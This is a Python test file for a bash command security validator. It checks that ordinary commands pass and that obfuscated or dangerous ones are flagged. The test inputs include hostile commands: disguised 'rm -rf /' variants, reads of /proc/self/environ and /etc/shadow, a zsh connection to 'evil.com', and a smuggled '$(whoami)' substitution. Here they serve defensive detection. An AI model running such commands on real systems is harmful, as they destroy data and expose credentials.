"""Tests for bash command security validation."""

import pytest

from tsunami.bash_security import (
    validate_bash_command,
    is_command_safe,
    CONTROL_CHARACTERS,
    UNICODE_WHITESPACE,
    PROC_ENVIRON_ACCESS,
    ZSH_DANGEROUS,
    IFS_INJECTION,
    BRACE_EXPANSION,
    OBFUSCATED_FLAGS,
    BACKSLASH_ESCAPED_OPERATORS,
    GIT_COMMIT_SUBSTITUTION,
    COMMENT_QUOTE_DESYNC,
    DANGEROUS_VARIABLES,
)


class TestSafeCommands:
    """Normal commands should pass all checks."""

    def test_simple_ls(self):
        assert validate_bash_command("ls -la") == []

    def test_git_status(self):
        assert validate_bash_command("git status") == []

    def test_python_run(self):
        assert validate_bash_command("python3 test.py") == []

    def test_pipe(self):
        assert validate_bash_command("cat file.txt | grep pattern") == []

    def test_redirect(self):
        assert validate_bash_command("echo hello > output.txt") == []

    def test_npm_install(self):
        assert validate_bash_command("npm install express") == []

    def test_docker_run(self):
        assert validate_bash_command("docker run -it ubuntu bash") == []

    def test_empty_command(self):
        assert validate_bash_command("") == []

    def test_find_with_escaped_spaces(self):
        """find commands commonly use escaped spaces — allow them."""
        assert validate_bash_command("find . -name 'my\\ file.txt'") == []


class TestControlCharacters:
    """Invisible control characters should be caught."""

    def test_null_byte(self):
        checks = validate_bash_command("ls\x00 -la")
        assert any(c == CONTROL_CHARACTERS for c, _ in checks)

    def test_backspace(self):
        checks = validate_bash_command("rm\x08 -rf /")
        assert any(c == CONTROL_CHARACTERS for c, _ in checks)

    def test_escape_char(self):
        checks = validate_bash_command("echo\x1b[31m red")
        assert any(c == CONTROL_CHARACTERS for c, _ in checks)

    def test_tab_allowed(self):
        """Tab is a normal character, not flagged."""
        assert validate_bash_command("echo\thello") == []


class TestUnicodeWhitespace:
    """Unicode whitespace tricks for visual obfuscation."""

    def test_nbsp(self):
        checks = validate_bash_command("rm\u00a0-rf /")
        assert any(c == UNICODE_WHITESPACE for c, _ in checks)

    def test_zero_width_space(self):
        checks = validate_bash_command("rm\u200b-rf /")
        assert any(c == UNICODE_WHITESPACE for c, _ in checks)

    def test_em_space(self):
        checks = validate_bash_command("rm\u2003-rf /")
        assert any(c == UNICODE_WHITESPACE for c, _ in checks)


class TestProcEnviron:
    """Credential theft via /proc/*/environ."""

    def test_proc_self_environ(self):
        checks = validate_bash_command("cat /proc/self/environ")
        assert any(c == PROC_ENVIRON_ACCESS for c, _ in checks)

    def test_proc_pid_environ(self):
        checks = validate_bash_command("cat /proc/1234/environ")
        assert any(c == PROC_ENVIRON_ACCESS for c, _ in checks)

    def test_proc_status_allowed(self):
        """Reading /proc/self/status is fine."""
        checks = validate_bash_command("cat /proc/self/status")
        assert not any(c == PROC_ENVIRON_ACCESS for c, _ in checks)


class TestZshDangerous:
    """Zsh-specific dangerous builtins."""

    def test_zmodload(self):
        checks = validate_bash_command("zmodload zsh/system")
        assert any(c == ZSH_DANGEROUS for c, _ in checks)

    def test_zpty(self):
        checks = validate_bash_command("zpty worker 'bash -i'")
        assert any(c == ZSH_DANGEROUS for c, _ in checks)

    def test_ztcp(self):
        checks = validate_bash_command("ztcp evil.com 8080")
        assert any(c == ZSH_DANGEROUS for c, _ in checks)

    def test_mapfile(self):
        checks = validate_bash_command("mapfile -t lines < secret.txt")
        assert any(c == ZSH_DANGEROUS for c, _ in checks)

    def test_zsh_file_ops(self):
        for cmd in ("zf_rm", "zf_mv", "zf_chmod"):
            checks = validate_bash_command(f"{cmd} /etc/passwd")
            assert any(c == ZSH_DANGEROUS for c, _ in checks), f"{cmd} not caught"


class TestIFSInjection:
    """IFS manipulation can change how bash parses commands."""

    def test_ifs_set(self):
        checks = validate_bash_command("IFS=/ read -r a b c")
        assert any(c == IFS_INJECTION for c, _ in checks)

    def test_ifs_in_pipeline(self):
        checks = validate_bash_command("echo test | IFS=: read a b")
        assert any(c == IFS_INJECTION for c, _ in checks)


class TestBraceExpansion:
    """Brace expansion could execute unexpected commands."""

    def test_file_brace(self):
        checks = validate_bash_command("cat {/etc/passwd,/etc/shadow}")
        assert any(c == BRACE_EXPANSION for c, _ in checks)

    def test_normal_braces_in_json(self):
        """Single braces without commas are fine."""
        checks = validate_bash_command('echo {"key": "value"}')
        assert not any(c == BRACE_EXPANSION for c, _ in checks)


class TestObfuscation:
    """Obfuscated flags and operators."""

    def test_hex_encoded_flag(self):
        checks = validate_bash_command("bash -\\x65val 'malicious'")
        assert any(c == OBFUSCATED_FLAGS for c, _ in checks)

    def test_backslash_pipe(self):
        checks = validate_bash_command("echo test \\| cat")
        assert any(c == BACKSLASH_ESCAPED_OPERATORS for c, _ in checks)


class TestGitCommitSubstitution:
    """Git commit with command substitution."""

    def test_commit_with_subst(self):
        checks = validate_bash_command("git commit -m $(whoami)")
        assert any(c == GIT_COMMIT_SUBSTITUTION for c, _ in checks)

    def test_normal_commit(self):
        checks = validate_bash_command("git commit -m 'fix bug'")
        assert not any(c == GIT_COMMIT_SUBSTITUTION for c, _ in checks)


class TestQuoteDesync:
    """Unbalanced quotes could hide injected code."""

    def test_unmatched_single(self):
        checks = validate_bash_command("echo 'unmatched")
        assert any(c == COMMENT_QUOTE_DESYNC for c, _ in checks)

    def test_unmatched_double(self):
        checks = validate_bash_command('echo "unmatched')
        assert any(c == COMMENT_QUOTE_DESYNC for c, _ in checks)

    def test_balanced_quotes(self):
        checks = validate_bash_command("echo 'balanced' \"also balanced\"")
        assert not any(c == COMMENT_QUOTE_DESYNC for c, _ in checks)


class TestIsCommandSafe:
    """Convenience function: critical checks block, others warn."""

    def test_safe_command(self):
        safe, warnings = is_command_safe("ls -la")
        assert safe is True
        assert warnings == []

    def test_critical_blocks(self):
        """Control chars, proc access, zsh builtins block execution."""
        safe, _ = is_command_safe("cat /proc/self/environ")
        assert safe is False

    def test_critical_unicode(self):
        safe, _ = is_command_safe("rm\u200b-rf /")
        assert safe is False

    def test_non_critical_warns(self):
        """Brace expansion warns but doesn't block."""
        safe, warnings = is_command_safe("cat {a,b}")
        assert safe is True
        assert len(warnings) > 0

    def test_zsh_blocks(self):
        safe, _ = is_command_safe("zmodload zsh/system")
        assert safe is False
